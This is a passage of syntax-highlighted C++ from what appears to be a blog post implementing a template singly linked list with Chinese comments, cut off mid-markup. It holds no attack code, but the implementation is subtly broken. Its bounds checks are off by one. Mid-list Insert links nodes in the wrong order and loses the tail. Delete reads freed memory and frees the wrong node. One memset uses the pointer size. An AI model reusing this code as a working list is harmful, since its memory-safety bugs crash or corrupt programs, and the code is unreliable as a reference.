class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SUCCESS 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INDEX_ERROR -2    <span class=\"comment\">//失败的索引号</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> BUFFER_ERROR -3   <span class=\"comment\">//申请内存失败</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LinkList</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">LinkList</span>();</span><br><span class=\"line\">\t~<span class=\"built_in\">LinkList</span>();</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">IsEmpty</span><span class=\"params\">()</span></span>;  <span class=\"comment\">//是否为空，空1 非空0</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">clear</span><span class=\"params\">()</span></span>;   <span class=\"comment\">//清空链表</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">GetElement</span><span class=\"params\">(IN DWORD dwIndex, OUT T&amp; Element)</span></span>;    <span class=\"comment\">//根据索引获取元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">GetElementIndex</span><span class=\"params\">(IN T&amp; Element)</span></span>;    <span class=\"comment\">//根据元素获取索引</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">Insert</span><span class=\"params\">(IN T Element)</span></span>;     <span class=\"comment\">//新增元素到最后</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">Insert</span><span class=\"params\">(IN DWORD dwIndex, IN T Element)</span></span>;    <span class=\"comment\">//根据索引新增元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">Delete</span><span class=\"params\">(IN DWORD dwIndex)</span></span>;    <span class=\"comment\">//根据索引删除元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">GetSize</span><span class=\"params\">()</span></span>;    <span class=\"comment\">//获取链表元素数量</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Print</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_NODE</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tT  Data;</span><br><span class=\"line\">\t\t_NODE *pNext;</span><br><span class=\"line\">\t&#125;NODE, *PNODE;</span><br><span class=\"line\">\t<span class=\"comment\">//PNODE GetIndexCurrentNode(DWORD dwIndex); //获取索引为dwIndex的指针</span></span><br><span class=\"line\">\t<span class=\"comment\">//PNODE GetIndexPreviousNode(DWORD dwIndex); //获取索引为dwIndex的前一个节点指针</span></span><br><span class=\"line\">\t<span class=\"comment\">//PNODE GetIndexNextNode(DWORD dwIndex); //获取索引为dwIndex的后一个节点指针</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tPNODE m_pList;\t\t\t\t\t\t<span class=\"comment\">//链表头指针，指向第一个节点\t\t\t\t</span></span><br><span class=\"line\">\tDWORD m_dwLength;\t\t\t\t\t\t<span class=\"comment\">//元素的数量\t\t</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">LinkList&lt;T&gt;::<span class=\"built_in\">LinkList</span>():<span class=\"built_in\">m_pList</span>(<span class=\"literal\">NULL</span>),<span class=\"built_in\">m_dwLength</span>(<span class=\"number\">0</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">LinkList&lt;T&gt;::~<span class=\"built_in\">LinkList</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">bool</span> LinkList&lt;T&gt;::<span class=\"built_in\">IsEmpty</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//判断头结点</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_pList == <span class=\"literal\">NULL</span> || m_dwLength == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;invalid index\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> LinkList&lt;T&gt;::<span class=\"built_in\">clear</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//判断链表是否非空</span></span><br><span class=\"line\">\t<span class=\"built_in\">IsEmpty</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//循环删除节点</span></span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\">\tPNODE pdeleteNode = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; m_dwLength; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpdeleteNode = ptempNode;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span> pdeleteNode;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//删除最后一个二节点，长度置0</span></span><br><span class=\"line\">\tm_dwLength = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">GetElement</span>(IN DWORD dwIndex, OUT T &amp; Element) <span class=\"comment\">//根据索引获取元素</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex &lt;<span class=\"number\">0</span> || dwIndex &gt; m_dwLength)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;index out of range\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\">\tDWORD data = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; dwIndex; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdata = ptempNode-&gt;Data;</span><br><span class=\"line\">\tElement = data;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">GetElementIndex</span>(IN T &amp; Element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_pList == <span class=\"literal\">NULL</span> || m_dwLength == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;invalid index\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; m_dwLength; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//memcmp(ptempNode,Element,sizeof(T))</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ptempNode-&gt;Data == Element)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tElement == ptempNode-&gt;Data;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">Insert</span>(IN T Element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//有元素，遍历到最后一个</span></span><br><span class=\"line\">\tPNODE pNewnode = <span class=\"keyword\">new</span> NODE;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pNewnode, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(NODE));</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(&amp;pNewnode-&gt;Data, &amp;Element, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//是否为空,空就往头结点后面插</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_pList == <span class=\"literal\">NULL</span> || m_dwLength == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tm_pList = pNewnode;</span><br><span class=\"line\">\t\tm_dwLength++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//不为空</span></span><br><span class=\"line\">\tPNODE ptempNode = m_pList;   <span class=\"comment\">//保存头指针</span></span><br><span class=\"line\">\t<span class=\"comment\">//while(ptempNode-&gt;next != NULL)</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; m_dwLength<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tptempNode-&gt;pNext = pNewnode;</span><br><span class=\"line\">\tpNewnode-&gt;pNext = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tm_dwLength++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">Insert</span>(IN DWORD dwIndex, IN T Element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPNODE pNewnode = <span class=\"keyword\">new</span> NODE;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pNewnode, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(PNODE));</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(&amp;pNewnode-&gt;Data, &amp;Element, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t<span class=\"comment\">//判断是否为空,即此时链表为空，要往第1个位置插</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_pList == <span class=\"literal\">NULL</span> || m_dwLength == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (dwIndex == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tm_pList = pNewnode;</span><br><span class=\"line\">\t\t\tm_dwLength++;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//是否索引有效</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex &lt;<span class=\"number\">0</span> || dwIndex &gt; m_dwLength)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;index out of range\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//如果索引为0，即链表不为空，但想往第一个位置插</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpNewnode-&gt;pNext = m_pList;</span><br><span class=\"line\">\t\tm_pList = pNewnode;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tm_dwLength++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex == m_dwLength)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//如果索引为链表尾，即链表不为空，但要往最后一个插</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; m_dwLength - <span class=\"number\">1</span>; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tptempNode-&gt;pNext = pNewnode;</span><br><span class=\"line\">\t\tpNewnode-&gt;pNext = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\tm_dwLength++;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//如果索引为链表中</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; dwIndex<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;  <span class=\"comment\">//循环到前一个节点</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tptempNode-&gt;pNext = pNewnode;  <span class=\"comment\">//把前一个节点和新节点相连</span></span><br><span class=\"line\">\tpNewnode-&gt;pNext = ptempNode-&gt;pNext-&gt;pNext;  <span class=\"comment\">//新节点和原来的next相连</span></span><br><span class=\"line\">\tm_dwLength++;</span><br><span class=\"line\">\t<span class=\"comment\">// 1 2 3   5  6</span></span><br><span class=\"line\">\t<span class=\"comment\">//       4</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD LinkList&lt;T&gt;::<span class=\"built_in\">Delete</span>(IN DWORD dwIndex)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//  1. 判断链表是否为空\t</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_pList == <span class=\"literal\">NULL</span> || m_dwLength == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//  2. 判断索引值是否有效</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex &lt;<span class=\"number\">0</span> || dwIndex &gt; m_dwLength)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;index out of range\\n&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tPNODE ptempNode = m_pList;</span><br><span class=\"line\">\t<span class=\"comment\">//  3. 如果链表中只有头节点，且要删除头节点\t\t\t</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex == <span class=\"number\">0</span> &amp;&amp; m_dwLength == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span> m_pList;</span><br><span class=\"line\">\t\tm_pList = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\tm_dwLength--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//  4. 如果要删除头节点\t\t</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//H 1 2 3 4 5</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span> m_pList;</span><br><span class=\"line\">\t\tm_pList = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t\tm_dwLength--;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//  5. 如果是其他情况</span></span><br><span class=\"line\">\tptempNode = m_pList;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">0</span>; i &lt; dwIndex<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// H 1 2 3 4 5</span></span><br><span class=\"line\">\t\tptempNode = ptempNode-&gt;pNext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tptempNode-&gt;pNext = ptempNode-&gt;pNext-&gt;pNext;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> ptempNode-&gt;pNext;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_dwLength--;</span><br><span 